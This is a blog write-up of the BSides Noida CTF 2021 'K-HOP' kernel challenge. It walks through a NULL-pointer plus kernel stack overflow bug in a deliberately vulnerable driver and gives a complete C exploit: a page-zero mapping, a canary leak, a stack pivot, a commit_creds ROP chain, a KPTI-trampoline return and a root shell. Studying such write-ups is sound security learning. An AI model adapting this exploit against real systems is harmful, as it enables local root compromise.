---
layout: post
title:  "BSides Noida CTF 2021 - PWN - K-HOP"
date:   2021-08-10 12:30:00 +0300
categories: ctf writeup
tags: pwn kernel linux
---

*Type: CTF task*

*Platform: Linux x64*

*Category: Kernel pwn*

*Idea: NULL-pointer dereference, kernel stack overflow, bypass SMEP +
KPTI.*

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image1.png)

This is a kernel-pwn task from BSides Noida CTF 2021
(<https://ctftime.org/event/1397>). We have FS, kernel image, run-script
and source code of kernel-module.

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image2.png)

Let\'s look at the startup script and determine which protections are
enabled.

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image3.png)

Okay we have SMEP+KPTI and no KASLR.

Let\'s start analyzing the driver code.

{% highlight c %}
char *message;
static dev_t first; // Global variable for the first device number
static struct cdev c_dev; // Global variable for the character device structure
static struct class *cl; // Global variable for the device class
{% endhighlight %}

We have some global message pointer. Let\'s see how the code works with
it:

{% highlight c %}
static int dev_open(struct inode *i, struct file *f)
{
	message = kmalloc(48, GFP_KERNEL);
	strcpy(message, "My char device, currently has a version v5.4.0\n");
    return 0;
}
{% endhighlight %}

When opening the device, we allocate a chunk on the heap and put the
pointer into a global variable, after which we copy the line there.

{% highlight c %}
static int dev_close(struct inode *i, struct file *f)
{
	kfree(message);
	message = NULL;
    return 0;
}
{% endhighlight %}

When the device is closed, we release the selected chunk and rewrite the
global variable to a null pointer. Here you can find the first error.
The fact is that if we open this driver twice and close the first one,
then in the second this pointer will be reset to NULL-pointer.

The only driver function that we can interact with from our program is
«dev_read».

{% highlight c %}
static ssize_t dev_read(struct file *fp, char *buf, size_t size, loff_t *off)
{
	char kernel_stack[48];
	int len = strlen(message);
    if (*off >= len) {
        return 0; /* end of file */
    }
    memcpy(kernel_stack, message, len);
	if(len > size - *off) {
        len = size - *off;
    }
    if(copy_to_user(buf, kernel_stack + *off, len)) {
        return -EFAULT;
    }

    *off += len;
    return len;
}
{% endhighlight %}

In this function, we can read the line that our global pointer points
to. The data will be placed in the buffer we specified. At first glance,
it seems that everything is safe here. But if we imagine that the global
pointer can turn out to be null, and in user space we can create a
memory page at address 0x0, then everything becomes quite interesting.
But first, let\'s see how the message size is calculated:

{% highlight c %}
size_t strlen(const char *s)
{
	const char *sc;

	for (sc = s; *sc != '\n'; ++sc)
		/* nothing */;
	return sc - s;
}
{% endhighlight %}

The code is very simple, and you can see that we are counting the size
not up to a zero-byte (as in the normal version of the function), but up
to a newline character.

**mmap_min_addr**

Let\'s go back to the discussion of address zero. In modern kernels,
with default settings, you cannot allocate a page at address zero. The
minimum address at which memory can be allocated is determined by the
value of the mmap_min_addr setting, you can find it out by reading the
file /proc/sys/vm/mmap_min_addr.

On a modern system with standard settings, you can see something like
this:

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image4.png)

And in our task, this value was rewritten in one of the initializing
scripts. As a result, we have:

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image5.png)

That is, we can create a memory page at address zero. Now we need to
figure out how to exploit this, but first we need to understand what we
can get by highlighting the page at address 0.

Looking again at the code of the read function (namely, in the first
part), you can see that we are copying the contents of message into a
buffer on the stack. In this case, the size is calculated from the
message.

{% highlight c %}
char kernel_stack[48];
int len = strlen(message);
if (*off >= len) {
    return 0; /* end of file */
}
memcpy(kernel_stack, message, len);
{% endhighlight %}

Thus, if we can write data at address zero that exceeds the size of the
buffer on the stack, then we will get a kernel stack overflow.

Excellent. We now have a full understanding of what kind of
vulnerability we have. But how do we build the operation?

First you need to get a kernel stack canary. This can be done by
creating a buffer long enough to fill the entire stack space up to the
canary, but not touch it. Then the function for calculating the length
will go through the canary and we will get its value.

{% highlight c %}
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>

uint64_t canary;

int main()
{
    char *mem = mmap(0, 0x1000, 7, 50, -1, 0);

    int leak = open("/dev/char_dev", O_RDONLY);
    int f_tmp = open("/dev/char_dev", O_RDONLY);
    close(f_tmp);

    memset(mem, 'X', 47);
    mem[47] = '\n';
    char s[256] = {0};

    read(leak, s, 48);
    memset(mem, 'X', 48);
    mem[48] = '\n';

    read(leak, s, 96);
    memcpy(&canary, &s[1], 8);

    printf("{+} Kernel stack canary: 0x%llx\n", canary);
    return 0;
}
{% endhighlight %}

So, our strategy for getting a canary:

1.  Create a memory page at address 0,

2.  We open the device two times and close one of them so that in the
    second the pointer becomes zero,

3.  We fill our memory with data at address zero and read it for the
    first time (first 47 bytes),

4.  Add one more byte and read again (second 48 bytes).

The double read is done in order to shift the offset and not get a stack
overflow.

Let\'s connect with a debugger and look at the moment of installing the
canary, after which we will launch our exploit and compare the values.

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image6.png)
Now let\'s launch the exploit:

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image7.png)

Great, we have a canary. We can now overflow the stack. Our next step
will be to bypass SMEP, for this we need to use ROP, for which we will
need to find gadgets. To search for gadgets, you have to unpack the
kernel and go through the utility to automatically search for the ROP
sequence (e.g. ropper, ROPgadget).

For convenient operation, we will carry out stack-pivoting on the memory
we control. For this we need only one gadget - pop rsp. After the stack
is transferred, we will execute our ROP chain, which should do the
following:

1.  Call **prepare_kernel_cred** function

2.  Call the **commit_creds** function

3.  Return from the kernel using the
    **swapgs_restore_regs_and_return_to_usermode** function (the
    so-called KPTI trampoline, which is used to bypass this mitigation).

First, let\'s write a stack pivot:

{% highlight c %}
puts("{!} Stage 3: stack pivoting and ROP-chain execution");
memset(mem, '\x00', 48);
memcpy(&mem[48], &canary, 8);
memset(&mem[56], '\x00', 48);

uint64_t stack_pivot_addr = 3500;
memcpy(&mem[104], &pop_rsp, 8);
memcpy(&mem[112], &stack_pivot_addr, 8);
mem[120] = '\n';
{% endhighlight %}

We do not move the stack to the very beginning of our data, because the
functions that we are going to call are actively using the stack and can
go out of bounds.

Now that we have translated the stack, we need to make the correct
chaining:

{% highlight c %}
const uint64_t prepare_kernel_cred = 0xffffffff810cc140;
const uint64_t commit_creds = 0xffffffff810cbdd0;
const uint64_t pop_rdi = 0xffffffff8104dec1;
const uint64_t xchg = 0xffffffff8110f940; // # xchg rax, rdi; or al, 0; pop rbp; ret;
const uint64_t iretq = 0xffffffff81039a1b;
const uint64_t pop_rsp = 0xffffffff81020360;
const uint64_t swapgs = 0xffffffff81c00a34 + 22;

uint64_t chain[] = {
    pop_rdi,
    0,
    prepare_kernel_cred,
    xchg,
    0,
    commit_creds,
    swapgs,
    0,
    0,
};
{% endhighlight %}

Since KASLR is off, all gadgets we find will work from launch to launch.
The chain completely coincides with what we wrote in our plan. The exit
to the user space will be through the KPTI trampoline.

Add our chain to the final payload:

{% highlight c %}
memcpy(&mem[3500], &chain, sizeof(chain));
save_state();

uint64_t *context = &mem[3500+sizeof(chain)];
context[0] = &drop_shell;
context[1] = user_cs;
context[2] = user_rflags;
context[3] = user_sp;
context[4] = user_ss;
context[5] = 10;

read(rop, s, 96);
{% endhighlight %}  

You may notice that a call to some function save_state () is a fairly
standard function when developing kernel exploits. It is necessary so
that we can correctly return from the kernel context to the user one.
This function allows us to save all the necessary registers that should
be on the stack at the time of returning from the kernel.

The final exploit.

{% highlight c %}
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <signal.h>

uint64_t canary;

const uint64_t prepare_kernel_cred = 0xffffffff810cc140;
const uint64_t commit_creds = 0xffffffff810cbdd0;
const uint64_t pop_rdi = 0xffffffff8104dec1;
const uint64_t xchg = 0xffffffff8110f940; // # xchg rax, rdi; or al, 0; pop rbp; ret;
const uint64_t iretq = 0xffffffff81039a1b;
const uint64_t pop_rsp = 0xffffffff81020360;
const uint64_t swapgs = 0xffffffff81c00a34 + 22;

uint64_t chain[] = {
    pop_rdi,
    0,
    prepare_kernel_cred,
    xchg,
    0,
    commit_creds,
    swapgs,
    0,
    0,
};

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void)
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3;\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
};

void drop_shell() {
    system("/bin/sh");
};


int main()
{
    puts("{!} Stage 1: alloc mem on NULL");
    char *mem = mmap(0, 0x1000, 7, 50, -1, 0);
    printf("{+} Allocated memory address: %p\n", mem);

    if (mem != NULL) {
        puts("{-} Allocation failed!");
        return -1;
    }

    puts("{!} Stage 2: leak kernel stack-cookie");
    int leak = open("/dev/char_dev", O_RDONLY);
    int rop = open("/dev/char_dev", O_RDONLY);
    int f_tmp = open("/dev/char_dev", O_RDONLY);
    close(f_tmp);

    memset(mem, 'X', 47);
    mem[47] = '\n';
    char s[256] = {0};

    read(leak, s, 48);
    memset(mem, 'X', 48);
    mem[48] = '\n';

    read(leak, s, 96);
    memcpy(&canary, &s[1], 8);

    printf("{+} Kernel stack canary: 0x%llx\n", canary);

    puts("{!} Stage 3: stack pivoting and ROP-chain execution");
    memset(mem, '\x00', 48);
    memcpy(&mem[48], &canary, 8);
    memset(&mem[56], '\x00', 48);

    uint64_t stack_pivot_addr = 3500;
    memcpy(&mem[104], &pop_rsp, 8);
    memcpy(&mem[112], &stack_pivot_addr, 8);
    mem[120] = '\n';

    memcpy(&mem[3500], &chain, sizeof(chain));
    save_state();

    uint64_t *context = &mem[3500+sizeof(chain)];
    context[0] = &drop_shell;
    context[1] = user_cs;
    context[2] = user_rflags;
    context[3] = user_sp;
    context[4] = user_ss;
    context[5] = 10;

    read(rop, s, 96);

    return 0;
}
{% endhighlight %}

We are testing our [exploit](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/exploit.c).

![](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/image8.png)

Great, the task has been solved.

All files (kernel image, FS, exploit, source code, help scripts) you can
find by this [link](/assets/2021-08-10-BSides-Noida-CTF-2021-Pwn-K-HOP/khop_tasks_files_and_exploit.7z).

**Summary**: For me, this task was quite interesting, because for the first time I solved the problem of kernel-pwn in a CTF.

